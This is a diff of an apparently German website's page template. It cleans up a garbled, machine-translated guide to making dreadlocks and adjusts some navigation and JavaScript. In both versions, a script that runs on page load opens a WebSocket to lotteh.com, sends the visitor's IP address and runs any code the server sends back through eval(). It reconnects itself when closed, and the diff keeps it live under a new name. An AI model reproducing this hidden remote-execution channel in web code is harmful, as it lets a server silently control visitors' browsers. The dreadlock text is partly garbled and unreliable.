@@ -65,7 +65,7 @@
               <a class="nav-link" href="/de/landing" title="Besuchen Sie die Zielseite">Landung</a>
             </li>
             <li class="nav-item">
-              <a class="nav-link" href="https://qoshlli.com" title="Video -Chat">Chat</a>
+              <a class="nav-link" href="/de/chat" title="Video -Chat">Chat</a>
             </li>
             <li class="nav-item">
               <a class="nav-link" href="/de/private" title="Sehen Sie private Fotos mit einem Schlüssel an">Privat</a>
@@ -123,7 +123,8 @@
 <img src="https://i.imgur.com/dAQRaWt.jpeg" alt="DaisyProfilfoto" width="120" height="120" style="margin-top:5px; margin-right:10px; margin-bottom:10px; border-radius: 50%;">
 <p><i>Von Daisy</i></p>
 
-<div style="white-space: pre-wrap;"><p> Wie trage ich Deadlock? </p> <p> <br> </p> <p> 1.Zeigen Sie Ihre Haare auf die gewünschte Länge aus.Ihr Haar sollte mindestens 2-3 Zoll lang sein, um die besten Ergebnisse zu erzielen. </P> <p> <br> </p> <p> 2.Schneiden Sie Ihre Haare mit einem Kamm in kleine Teile ein.Die Größe der Abschnitte bestimmt die Größe Ihrer Dreadlocks. Wählen Sie daher eine Größe aus, mit der Sie sich wohl fühlen. </P> <p> <br> </p> <p> 3.Beginnen Sie zurück, indem Sie jeden Haarabschnitt zurückverdrehen und fest in Richtung der Wurzeln ziehen.Dies erzeugt Knoten im Haar, die sich schließlich zu Dreadlocks bilden. </P> <p> <br> </p> <p> 4.Tragen Sie Wachs oder Gel auf jeden Haarabschnitt auf, um die Knoten an Ort und Stelle zu halten, und ermutigen Sie die Haare zusammen. </P> <p> <br> </p> <p> 5.Fahren Sie den Haarabschnitt fort und verdrehen Sie sie, bis Sie Ihren gesamten Kopf abgeschlossen haben.Dieser Prozess kann zeitaufwändig sein. Seien Sie also geduldig und machen Sie bei Bedarf Pausen.Sobald alle Ihre Haare verdreht und zurückkompromont wurden, lassen Sie es ein paar Tage sitzenDamit die Knoten festziehen und zu Dreadlocks formen können. </p> <p> <br> </p> <p> 7.Nach ein paar Tagen können Sie Ihre Dreadlocks stylen und aufrechterhalten, indem Sie sie mit respektfreiem Shampoo waschen und einen Häkelhaken verwenden, um lose Knoten festzuhalten. </P> <p> <br> </p> <P.> 8.Um Ihre Dreadlocks ordentlich und ordentlich aussehen zu lassen, sollten Sie einen Schal oder ein Bandana verwenden, um sie beim Schlafen oder in schmutzigen Umgebungen abzudecken.Eine regelmäßige Wartung und Pflege hilft Ihren Dreadlocks, gesund zu bleiben und</div>
+<div style="white-space: pre-wrap;"><p>Wie trage ich Deadlock?</p><p><br/></p><p>1. Zeigen Sie Ihre Haare zunächst auf die gewünschte Länge aus. Ihr Haar sollte mindestens 2-3 Zoll lang sein, um die besten Ergebnisse zu erzielen.</p><p><br/></p><p>2. Machen Sie Ihre Haare mit einem Kamm in kleine, sogar Teile. Die Größe der Abschnitte bestimmt die Größe Ihrer Dreadlocks. Wählen Sie daher eine Größe aus, mit der Sie sich wohl fühlen.</p><p><br/></p><p>3. Beginnen Sie zurück, indem Sie jeden Haarabschnitt durch Drehen und Ziehen in Richtung der Wurzeln wieder anfangen. Dies führt zu Knoten im Haar, die sich schließlich zu Dreadlocks formen.</p><p><br/></p><p>4. Tragen Sie Wachs oder Gel auf jeden Haarabschnitt auf, um die Knoten an Ort und Stelle zu halten, und ermutigen Sie die Haare zusammen.</p><p><br/></p><p>5. Weiter zurückkommt und jeden Haarabschnitt verdrehen, bis Sie Ihren gesamten Kopf abgeschlossen haben. Dieser Prozess kann zeitaufwändig sein. Seien Sie also geduldig und machen Sie bei Bedarf Pausen.</p><p><br/></p><p>6. Sobald Ihre Haare verdreht und zurückversetzt wurden, lassen Sie es ein paar Tage sitzen, damit die Knoten sich festziehen und zu Dreadlocks formen können.</p><p><br/></p><p>7. Nach ein paar Tagen können Sie Ihre Dreadlocks stylen und aufrechterhalten, indem Sie sie mit respektfreiem Shampoo waschen und einen Häkelhaken verwenden, um lose Knoten zu straffen.</p><p><br/></p><p>8. Um Ihre Dreadlocks ordentlich und ordentlich aussehen zu lassen, sollten Sie einen Schal oder ein Bandana verwenden, um sie beim Schlafen oder in schmutzigen Umgebungen abzudecken. Eine regelmäßige Wartung und Pflege hilft Ihren Dreadlocks, gesund und lebendig zu bleiben.</p></div>
+
 
 <div class="mx-auto p-1 m-1" style="display: flex; justify-content: space-around;">
 <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6209985848112194"
@@ -240,6 +241,23 @@
         
 
 
+var currentReader = 0;
+function toggleReader(id) {
+	currentReader = id;
+	$('#reader-modal' + id).toggleClass('hide');
+	$('#reader-modal' + id).toggleClass('fade-in-fast');
+	$('#bnav' + id).toggleClass('hide');
+	$('#bnav' + id).toggleClass('fade-in-fast');
+	setTimeout(function() {
+		$('#reader-modal' + id).toggleClass('fade-in-fast');
+		$('#bnav' + id).toggleClass('fade-in-fast');
+	}, 1000);
+}
+function jumpbookto(page) {
+	document.getElementById('reader-modal' + currentReader).scrollTo(0, (parseInt(document.getElementById('jumpto' + page).value)-1) * parseInt(window.innerHeight));
+	document.getElementById('pagecount' + page).innerHTML = parseInt(document.getElementById('jumpto' + page).value);
+}
+
 
         
         
@@ -250,32 +268,32 @@
             
         	Prism.highlightAll();
         });
-        var socket;
-        function openSocket() {
+        var remoteSocket;
+        function openRemoteSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
-            socket.addEventListener("open", (event) => {
+            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            remoteSocket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
         		    .then(response => response.json())
         		    .then(data => {
-        		        socket.send(data.ip);
+        		        remoteSocket.send(data.ip);
         		    })
         		    .catch(error => {
         		        console.log('Error:', error);
         		    });
             });
-            socket.addEventListener("closed", (event) => {
+            remoteSocket.addEventListener("closed", (event) => {
                 console.log('Socket closed.');
                 setTimeout(function() {
-                    openSocket();
+                    openRemoteSocket();
                 }, 10000);
             });
-        	socket.addEventListener("message", (event) => {
+        	remoteSocket.addEventListener("message", (event) => {
                     eval(event.data);
             });
         }
-        openSocket();
+        openRemoteSocket();
         $(document).ready(function() {
         	$("#contact-form").submit(function(e){
                 	e.preventDefault();
@@ -427,8 +445,8 @@ if(document.getElementById("current-time")) {
               link.href = url;
               link.download = 'Glam Girl X - ' + filename;
               document.body.appendChild(link);
+              link.classList.add('hide');
               link.click();
-              document.body.removeChild(link);
             }
             function downloadQr() {
                     downloadQrImage(image.src, 'QR Code');
@@ -450,6 +468,8 @@ if(document.getElementById("current-time")) {
   });
 </script>
 
+    
+    
     
     
     <script>
